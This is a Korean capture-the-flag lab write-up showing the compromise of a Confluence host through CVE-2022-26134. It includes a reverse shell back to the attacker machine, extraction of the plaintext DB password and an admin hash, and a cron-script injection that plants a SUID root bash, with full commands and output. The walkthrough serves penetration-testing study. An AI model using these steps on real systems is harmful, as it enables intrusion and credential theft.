/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 40720
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh
```

**`/etc/passwd` 에서 뽑아야 할 정보 — 여기서 실제로 건진 것**

| 줄 | 의미 |
|---|---|
| `confluence:x:1001:1001:...:/home/confluence:/bin/sh` | UID 1001, 홈이 `/home/confluence`, 셸이 있다. → `local.txt` 를 여기서 찾으면 된다 |
| `lxd:x:999:100::/var/snap/lxd/...` | LXD 설치돼 있음. 셸을 잡으면 `id` 로 내가 `lxd` 그룹인지 확인할 값어치가 있다 |
| `mysql:x:109:115:MySQL Server` | MySQL 존재. Confluence의 DB 자격증명이 설정 파일에 평문으로 있을 수 있다 |
| 일반 사용자가 `confluence` 뿐 | 횡이동 대상이 없다 → 권한상승은 곧바로 root를 노려야 한다 |

⚠️ `lxd` 그룹은 **가능성이지 사실이 아니었다.** `/etc/passwd` 에 lxd 계정이 있다는 것은 LXD가 설치됐다는 뜻일 뿐이다.
2차 세션의 `id` 가 결론을 냈다 — `groups=1001(confluence)`, **`lxd` 그룹이 아니다**(§4-1). 이 후보는 반증됐다.
반면 `mysql` 줄에서 나온 추론은 맞았다 — DB 비밀번호가 평문으로 있었다(§4-3). **다만 그것도 root 로 이어지지는 않았다.**

### 3-3. 리버스셸

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --reverse-shell
(배너 및 SyntaxWarning 동일 — 생략하지 않고 원문 그대로 아래에 이어진다)
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 46170
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
confluence@flu:/opt/atlassian/confluence/bin$ whoami
whoami
confluence
confluence@flu:/opt/atlassian/confluence/bin$
confluence@flu:/opt/atlassian/confluence$ cd /home/confluence
cd /home/confluence
confluence@flu:/home/confluence$ ls
ls
local.txt
confluence@flu:/home/confluence$ cat local.txt
cat local.txt
2d0c7239ce98c1add6986385f076c26e
confluence@flu:/home/confluence$
```

![[Pasted image 20260714142017.png]]

> [!note] 출력에서 읽을 것
> - `cannot set terminal process group` / `no job control` — **정상이다.** TTY 없이 붙은 셸의 표준 증상이다. `Ctrl-C` 가 셸을 죽이고 `su`·`ssh`·`sudo` 가 거부될 수 있으므로 TTY 업그레이드가 필요하다:
>   `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`
> - 명령이 두 번씩 보이는 것(`whoami` / `whoami`) — 로컬 에코다. 역시 TTY 부재의 증상이다
> - 시작 디렉터리가 `/opt/atlassian/confluence/bin` — **Confluence 프로세스의 CWD를 그대로 물려받았다**는 증거다. RCE가 서비스 프로세스 안에서 일어났음을 확인해 준다
> - 프롬프트가 `confluence@flu` — **root가 아니다.** 익스플로잇이 주는 권한은 곧 그 서비스의 실행 계정이다

> [!danger] 플래그는 대화형 셸에서 읽었다 — 이게 시험 요건이다
> OSCP는 **웹셸로 얻은 플래그를 0점 처리**한다. 규정 원문: *"this includes any type of web-based shell"*.
> 이 박스는 `nc` 리버스셸(대화형)에서 `cat local.txt` 했으므로 요건을 만족한다.
> 다만 **증거 스크린샷 형식은 미흡했다** — 시험이라면 `whoami; hostname; ip a; cat local.txt` 를 한 화면에 담아야 한다. 위 스크린샷에는 `ip a` 가 없다. [[Butch]] 참조.

---

## 4. 권한상승 — `confluence` → root

2차 세션(2026-08-20)에서 같은 익스플로잇으로 셸을 다시 잡고 처음부터 열거했다. 아래는 전부 `~/PG/Flu/privesc_session.log` 에서 나온 실측이다.

TTY 가 없어 명령이 두 번씩 에코되는데(§3-3 참조), 읽기 편하도록 **중복 에코 줄만** 걷어냈다. 출력은 손대지 않았다.

### 4-1. 반사 명령 — 5개를 한 줄로

```bash
confluence@flu:/opt/atlassian/confluence/bin$ id; echo ===; uname -a; cat /etc/os-release | head -3; echo ===; sudo -n -l 2>&1; echo ===; ls -la /home /root 2>&1; echo ===; getcap -r / 2>/dev/null
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
===
Linux flu 6.2.0-39-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 14 14:18:00 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
===
sudo: a password is required
===
/home:
total 12
drwxr-xr-x  3 root       root       4096 Dec 12  2023 .
drwxr-xr-x 19 root       root       4096 Dec 12  2023 ..
drwxr-xr-x  4 confluence confluence 4096 Aug  2  2024 confluence
ls: cannot open directory '/root': Permission denied
===
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/snap/core22/607/usr/bin/ping cap_net_raw=ep
```

**이 한 화면에서 후보가 세 개 죽었다.**

| 관측 | 죽은 후보 |
|---|---|
| `groups=1001(confluence)` — 그룹이 자기 자신뿐 | §3-2 에서 가능성으로 짚어 두었던 `lxd` 그룹 경로가 반증됐다. `/etc/passwd` 에 `lxd` 계정이 있다는 것은 LXD 가 설치됐다는 뜻일 뿐이었다. `docker`·`disk`·`adm`·`sudo` 도 전부 없다 |
| `sudo: a password is required` | `sudo -l` 열거조차 못 한다. `NOPASSWD` 항목이 하나라도 있으면 비밀번호 없이 나열되므로, 이 문구는 "NOPASSWD 항목이 없다"와 같다 |
| `getcap` — `ping`·`mtr-packet`·`gst-ptp-helper` | 전부 배포판 기본값이다. `cap_setuid`·`cap_dac_read_search`·`cap_sys_admin` 같은 쓸 만한 것이 없다 |

> [!note] `sudo -n -l` 의 `-n` 은 붙이는 게 낫다
> `-n`(non-interactive) 이 없으면 `sudo -l` 이 **비밀번호 프롬프트에서 멈춘다.** TTY 없는 리버스셸에서는 그대로 셸이 먹통이 될 수 있다.
> `-n` 을 주면 프롬프트 대신 `sudo: a password is required` 한 줄을 뱉고 즉시 돌아온다. 판정에 필요한 정보는 똑같다.

`uname` 이 준 것도 중요하다 — **Ubuntu 23.04 / kernel 6.2.0-39-generic**. 1차 세션 노트가 SSH 배너를 보고 "22.04 계열"로 추정했는데 **틀렸다**(§6-⑩). 그리고 nmap 의 `Linux 5.0 - 5.14` 추정도 실제 6.2 와 어긋난다.

### 4-2. SUID·SGID·리스닝 포트 — 전부 공백

```bash
confluence@flu:/opt/atlassian/confluence/bin$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/libexec/polkit-agent-helper-1
(이하 /snap/core22/607/... 은 위 목록의 스냅 사본이라 생략하지 않고 원문에 그대로 있다)
```

**한 줄도 비표준이 없다.** Ubuntu 를 새로 깔면 나오는 목록 그대로다. `pkexec`(CVE-2021-4034) 도 없다.

리스닝 포트를 보면 8091 의 정체가 드러난다:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ss -lntup
Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:Port Process
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      10                      *:8090             *:*   users:(("java",pid=1123,fd=44))
tcp   LISTEN 0      1024                    *:8091             *:*   users:(("java",pid=1420,fd=21))
tcp   LISTEN 0      4096                    *:22               *:*
tcp   LISTEN 0      1      [::ffff:127.0.0.1]:8000             *:*   users:(("java",pid=1123,fd=77))
```

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ps -eo user,pid,args | grep -v "\["
...
conflue+    1123 /opt/atlassian/confluence/jre//bin/java ... org.apache.catalina.startup.Bootstrap start
conflue+    1420 /opt/atlassian/confluence/jre/bin/java -classpath /opt/atlassian/confluence/temp/4.0.0-master-3b3337da.jar:/opt/atlassian/confluence/confluence/WEB-INF/lib/mysql-connector-java-8.2.0.jar -Xss2048k -Xmx2g synchrony.core sql
```

> [!note] 8091 = Synchrony — 1차 세션의 [가정]이 해소됐다
> §6-⑨ 는 8091(`Server: Aleph/0.4.6`)을 "Confluence 와 무관한 별개의 Clojure 서비스"로 적고 [가정] 을 달아 뒀다. **절반만 맞았다.**
> `synchrony.core` 는 Confluence 의 **협업 편집(동시 편집) 백엔드**다. Confluence 본체와 같은 JRE, 같은 설치 디렉터리, 같은 `confluence` 계정으로 돈다. Clojure 로 쓰였기 때문에 HTTP 계층이 Aleph 였던 것이다.
> 즉 별개 제품이 아니라 같은 제품의 두 번째 프로세스다. 그리고 실행 계정이 같으니 **권한상승 경로가 아니다** — 8091 을 아무리 잘 뚫어도 다시 `confluence` 다.
> 이건 §6-⑥ 과 같은 교훈이다: 셸을 쥔 뒤 `ss -lntup` 한 줄이면 **밖에서 며칠 헤맬 포트의 정체가 1초에 끝난다.**

### 4-3. DB 자격증명 — 얻었지만 아무 데도 안 열렸다

Confluence 는 DB 비밀번호를 설정 파일에 평문으로 둔다.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ grep -iE "password|username|url|driver" /var/atlassian/application-data/confluence/confluence.cfg.xml
    <property name="hibernate.connection.driver_class">com.mysql.jdbc.Driver</property>
    <property name="hibernate.connection.password">HoldingOn12</property>
    <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/confluence</property>
    <property name="hibernate.connection.username">confluence</property>
```

> [!warning] 파일 위치가 예상과 다르다
> 처음엔 `/opt/atlassian/confluence/confluence/WEB-INF/classes/confluence.cfg.xml` 일 것으로 짐작했다. **거기에 없다.**
> `find / -name confluence.cfg.xml` 이 준 실제 위치는 두 곳이다:
> `/var/atlassian/application-data/confluence/confluence.cfg.xml` 와 `.../shared-home/confluence.cfg.xml`.
> **Confluence 의 설정은 설치 디렉터리(`/opt/atlassian/confluence`)가 아니라 홈 디렉터리(`/var/atlassian/application-data/confluence`)에 있다.** 경로를 외우지 말고 `find` 를 쓰는 편이 빠르다.

DB 에서 Confluence 관리자 해시까지는 나왔다:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ mysql -u confluence -pHoldingOn12 confluence -e "select user_name,credential from cwd_user;"
mysql: [Warning] Using a password on the command line interface can be insecure.
user_name	credential
admin	{PKCS5S2}MCB0MaBA39GjOQb3wG0ioM7w+pPdQXdy5GskVAtS5/Ef0fCnvr8jPMdZ2CDhM0ke
```

여기서 멈췄다. `{PKCS5S2}` 는 Atlassian 의 PBKDF2-HMAC-SHA1(10000 라운드) 이고, 깨도 나오는 것은 **Confluence 웹 UI 의 admin 비밀번호**이지 OS 계정이 아니다. 이미 OS 셸을 쥔 상태에서 웹 admin 을 얻는 것은 §6-⑥ 과 같은 방향 착오다.
`HoldingOn12` 를 OS 쪽에 재사용하는 것은 시도할 값어치가 있었지만, 아래 §4-4 가 먼저 답을 내서 실제로 해보지 않았다. **안 해봤다.**

### 4-4. 결정타 — `find / -writable`

여기까지 표준 열거가 전부 공백이었다. 그래서 방향을 바꿨다: **"내가 쓸 수 있는 남의 것"** 을 찾는다.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ find / -writable -not -path "/proc/*" -not -path "/sys/*" -not -path "/tmp/*" -not -path "/var/tmp/*" -not -path "/run/*" -not -path "/opt/atlassian/*" -not -path "/var/atlassian/*" -not -path "/home/confluence/*" -not -path "/dev/*" 2>/dev/null | head -60
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/screen-cleanup.service
...
/var/lock
/var/crash
/var/tmp
/home/confluence
/opt/log-backup.sh
/tmp
```

> [!tip] 제외 경로를 안 주면 이 명령은 쓸모가 없다
> `-not -path` 없이 돌리면 **내 홈·`/tmp`·`/proc` 이 수천 줄**을 채워 진짜 한 줄이 묻힌다.
> 최소한 `/proc`·`/sys`·`/tmp`·`/var/tmp`·`/run`·`/dev`·내가 소유한 디렉터리(여기서는 `/opt/atlassian`·`/var/atlassian`·`/home/confluence`)를 빼라. 그러고 나면 남는 줄이 20개 안쪽이다.
>
> 위 목록의 `/usr/lib/systemd/system/*.service` 들은 **함정이다.** 전부 `/dev/null` 로 심볼릭 링크된 마스킹된 유닛이고, `find -writable` 이 링크 대상(`/dev/null`, 0666)의 권한을 보고 판정한 것이다. 실제로 그 파일에 쓰면 `/dev/null` 에 쓰는 것이라 아무 일도 안 일어난다. `ls -la` 로 링크인지 먼저 확인하라.

`/opt/log-backup.sh` 만 남는다.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ ls -la /opt/
total 756692
drwxr-xr-x  3 root       root            4096 Dec 12  2023 .
drwxr-xr-x 19 root       root            4096 Dec 12  2023 ..
drwxr-xr-x  3 root       root            4096 Dec 12  2023 atlassian
-rwxr-xr-x  1 root       root       774829955 Dec 12  2023 atlassian-confluence-7.13.6-x64.bin
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh

confluence@flu:/opt/atlassian/confluence/bin$ cat /opt/log-backup.sh
#!/bin/bash

CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

# Create a backup of log files
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP

tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP

# Cleanup old backups
find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;
```

세 줄이 전부 말해 준다:

1. `-rwxr-xr-x 1 confluence confluence` — **내가 쓸 수 있다**. `/opt` 디렉터리 자체는 root 소유지만 파일 하나의 소유자가 `confluence` 다
2. `BACKUP_DIR="/root/backup"` — `/root` 아래에 쓴다. `/root` 는 `drwx------ root root` 이므로 이 스크립트는 **root 로 실행될 수밖에 없다**
3. `-mmin +5` — 5분보다 오래된 백업을 지운다. **분 단위로 도는 작업**이라는 뜻이다

> [!danger] 크론 열거가 "아무것도 없음"이었는데 크론이 있었다
> §4-1 에서 `/etc/crontab`·`/etc/cron.d`·`/etc/cron.hourly` 는 전부 배포판 기본값이었고 `crontab -l` 은 `no crontab for confluence` 였다.
> **그런데 root 개인 crontab 에 있었다.** root 권한을 얻은 뒤 확인한 것:
>
> ```bash
> root@flu:/opt/atlassian/confluence/bin# crontab -l
> ...
> # m h  dom mon dow   command
>
> */1 * * * * /opt/log-backup.sh
>
> root@flu:/opt/atlassian/confluence/bin# ls -la /var/spool/cron/crontabs/
> total 12
> drwx-wx--T 2 root crontab 4096 Dec 12  2023 .
> drwxr-xr-x 3 root root    4096 Apr 15  2023 ..
> -rw------- 1 root crontab 1122 Dec 12  2023 root
> ```
>
> `/var/spool/cron/crontabs` 는 `drwx-wx--T` — **읽기 권한이 없다.** 목록조차 볼 수 없고 `root` 파일은 `0600` 이다.
> **일반화: 저권한 사용자에게 크론은 근본적으로 부분 관측이다.** `/etc/cron*` 이 비었다고 "크론 없음"으로 결론 내면 안 된다.
> 사용자 개인 crontab 의 존재는 **간접 증거로만** 잡힌다 — 여기서는 (a) 남의 홈에 쓰는 스크립트가 있고 (b) 그게 내 소유라는 것. `pspy` 로 프로세스 생성을 엿보는 것도 같은 목적의 수단이다.

### 4-5. 익스플로잇 — 한 줄 추가하고 1분 기다린다

원본을 먼저 백업했다(정리용). 페이로드는 SUID bash 를 만드는 한 줄이다.

`base64 -d` 로 밀어 넣은 이유는 TTY 없는 셸에서 **따옴표와 리다이렉션이 tmux `send-keys` 를 거치며 깨지는 것을 피하기 위해서**다. 디코드되는 내용은 `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` 다.

```bash
confluence@flu:/opt/atlassian/confluence/bin$ cp /opt/log-backup.sh /tmp/.lb.orig; echo Y3AgL2Jpbi9iYXNoIC90bXAvcm9vdGJhc2g7IGNobW9kIDQ3NTUgL3RtcC9yb290YmFzaA== | base64 -d >> /opt/log-backup.sh; tail -3 /opt/log-backup.sh; date
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbashThu Aug 20 04:52:17 AM UTC 2026
```

그리고 기다린다:

```bash
confluence@flu:/opt/atlassian/confluence/bin$ for i in $(seq 1 100); do [ -f /tmp/rootbash ] && break; sleep 5; done; date; ls -la /tmp/rootbash 2>&1; ls -la /root/backup 2>&1 | head -5
Thu Aug 20 04:53:05 AM UTC 2026
-rwsr-xr-x 1 root root 1437832 Aug 20 04:53 /tmp/rootbash
ls: cannot access '/root/backup': Permission denied
```

**48초 만에 떨어졌다.** `-rwsr-xr-x root root` — SUID 비트가 붙은 root 소유 bash 다.

**무작정 `sleep 60` 하지 말고 폴링 루프를 쓴다**
`for i in $(seq 1 100); do [ -f 타겟 ] && break; sleep 5; done` 는
- 주기를 모를 때도 통한다 (여기서는 1분이었지만 5분일 수도 있었다)
- 도착하는 즉시 빠져나온다 — 고정 `sleep` 처럼 남은 시간을 버리지 않는다
- 상한이 있어 크론이 안 돌 때 셸이 영원히 먹통이 되지 않는다 (여기선 최대 500초)

그리고 **`date` 를 앞뒤로 찍어라.** 위 두 블록의 `04:52:17` → `04:53:05` 가 "크론이 실제로 돌았다"는 유일한 직접 증거다.

> [!warning] SUID bash 를 고른 이유 — 그리고 `-p` 를 빠뜨리면 안 되는 이유
> 크론 페이로드의 선택지는 여럿이다: `/etc/sudoers` 에 줄 추가, `/root/.ssh/authorized_keys` 에 키 추가, root 리버스셸 발사, SUID 셸 복사.
> **SUID bash 를 고른 이유는 되돌리기가 가장 싸기 때문이다** — 파일 하나 지우면 끝이고, root 의 설정 파일이나 `.ssh` 를 건드리지 않는다. 리스너를 하나 더 띄울 필요도 없다.
>
> 대신 함정이 있다. **bash 는 SUID 로 실행되면 기본적으로 특권을 버린다** — `euid != uid` 를 감지하면 실효 UID 를 실제 UID 로 되돌린다. `-p`(privileged) 를 줘야 그 강등을 건너뛴다.
> `/tmp/rootbash` 를 그냥 실행하면 **평범한 `confluence` 셸이 나온다.** 반드시 `/tmp/rootbash -p` 다.

### 4-6. root 확인

```bash
confluence@flu:/opt/atlassian/confluence/bin$ python3 -c "import pty;pty.spawn([\"/tmp/rootbash\",\"-p\"])"
rootbash-5.2# id
uid=1001(confluence) gid=1001(confluence) euid=0(root) groups=1001(confluence)
```

`euid=0` 이니 이미 무엇이든 읽을 수 있다. 다만 `uid` 는 여전히 1001 이라 프롬프트도 `rootbash-5.2#` 로 뜬다. 증거 스크린샷에 `uid=0(root)` 를 담고 싶으면 한 단계 더 간다:

```bash
rootbash-5.2# python3 -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\",\"-i\")"
root@flu:/opt/atlassian/confluence/bin# id
uid=0(root) gid=0(root) groups=0(root),1001(confluence)
```

**`euid=0` 과 `uid=0` 의 실무적 차이**
플래그를 읽는 데는 `euid=0` 이면 충분하다. 차이가 생기는 곳은 따로 있다:
- 일부 도구가 `getuid()` 로 권한을 판정해 거부한다
- `su`·`ssh`·`sudo` 같은 SUID 프로그램이 실제 UID 를 본다
- **증거 스크린샷** — `uid=0(root)` 한 줄이 심사관에게 훨씬 명확하다

`setresuid(0,0,0)` 은 실제·실효·저장 UID 를 전부 0 으로 못 박는다. `euid` 가 이미 0 이라 허용된다.

---

## 5. 플래그

두 플래그 모두 **대화형 셸에서 원위치 `cat`** 으로 읽었다. 웹셸을 경유하지 않았다.

```bash
root@flu:/opt/atlassian/confluence/bin# id; whoami; hostname; hostname -I; date; echo ---; cat /root/proof.txt; cat /home/confluence/local.txt; echo ---; ls -l /root/proof.txt /home/confluence/local.txt
uid=0(root) gid=0(root) groups=0(root),1001(confluence)
root
flu
192.168.248.41
Thu Aug 20 04:54:36 AM UTC 2026
---
2caa37b3c096709c688b69556c3c6cf7
52791694c2a6ccde2db0f566f81d084f
---
-rw-r--r-- 1 confluence confluence 33 Aug 20 04:45 /home/confluence/local.txt
-rw-r--r-- 1 root       root       33 Aug 20 04:46 /root/proof.txt
```

| 플래그 | 위치 | 값 | 방법 |
|---|---|---|---|
| `local.txt` | `/home/confluence/local.txt` | `2d0c7239ce98c1add6986385f076c26e` (1차 세션 · 제출 완료) | CVE-2022-26134 리버스셸 |
| `proof.txt` | `/root/proof.txt` | `2caa37b3c096709c688b69556c3c6cf7` | root cron 이 도는 쓰기 가능 스크립트 → SUID bash |

> [!danger] PG 는 리버트할 때마다 플래그 값을 새로 만든다
> 2차 세션에서 읽은 `local.txt` 는 `52791694c2a6ccde2db0f566f81d084f` 로 **1차 세션의 값과 다르다.**
> 1차 값은 그 인스턴스에서 이미 제출돼 유효했고, 지금 다시 넣으면 거부된다.
> **함의: 플래그를 적어 두고 나중에 제출하려는 계획은 리버트 한 번에 무효가 된다.** 읽으면 그 세션 안에 넣어라.

> [!warning] `--read-file /root/proof.txt` 가 실패한 진짜 이유 — 직관적인 설명은 틀렸다
> 직관적으로는 *"`/root/proof.txt` 는 통상 `0600 root:root` 다"* 로 보이나, **실측은 `-rw-r--r--`(0644) 다.** 파일 자체는 누구나 읽을 수 있는 모드다.
> 막은 것은 **디렉터리**다 — `/root` 가 `drwx------ root root` 라서 `confluence` 는 그 안으로 경로 탐색 자체가 안 된다(§4-1 의 `ls: cannot open directory '/root': Permission denied`).
> 결론(권한 경계를 못 넘는다)은 같지만 이유가 다르고, 그 차이가 실무적으로 중요하다: 파일 모드만 보고 "읽을 수 있겠네"라고 판단하면 안 된다. **경로 위의 모든 디렉터리에 `x` 권한이 있어야 파일에 닿는다.**

---

## 6. 막혔던 지점 / 시행착오

**이 장의 출처**
①~⑨는 1차 세션(2026-07-14)의 것이고, **Kali `~/.zsh_history` 에서 회수한 실제 명령**이다. 원본 노트에는 성공 경로만 적혀 있었다.
오류 문구는 **Kali에서 직접 재현해 확인**했다(② ③ 제외 — 그 둘은 재현 방법을 각 항목에 명시했다).
⑩~⑫는 2차 세션(2026-08-20)의 것이고 `~/PG/Flu/privesc_session.log` 에서 나왔다.

### ① `searchsploit` 이 7.13.6을 못 찾았다 — 그런데 답은 있었다

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ searchsploit atlassian 7.
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
AppFusions Doxygen for Atlassian Confluence 1.3.2 - Cross-Site Scri | java/webapps/40817.txt
Atlassian Confluence 7.12.2 - Pre-Authorization Arbitrary File Read | java/webapps/50377.txt
Atlassian Confluence < 8.5.3 - Remote Code Execution                | multiple/webapps/51904.py
Atlassian JIRA 3.7.3 - BrowseProject.JSPA Cross-Site Scripting      | jsp/webapps/29576.txt
Atlassian Tempo 6.4.3 / JIRA 5.0.0 / Gliffy 3.7.0 - XML Parsing Den | jsp/dos/37218.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

![[Pasted image 20260714141054.png]]

**`searchsploit` 에 CVE-2022-26134 항목이 없다.** exploit-db에 없는 게 아니라 이 로컬 DB의 제목 색인에 안 잡혔을 뿐이다.

**`searchsploit` 이 비면 GitHub으로 간다 — 검색어를 바꾸는 게 아니라 채널을 바꾼다**
로컬 exploit-db는 exploit 세계의 부분집합이다. **CVE 번호를 손에 쥐었으면 `github.com` 에서 그 번호로 검색**하는 것이 다음 수다.
이 박스에서 실제로 그렇게 해서 `jbaines-r7/through_the_wire` 를 찾았다.
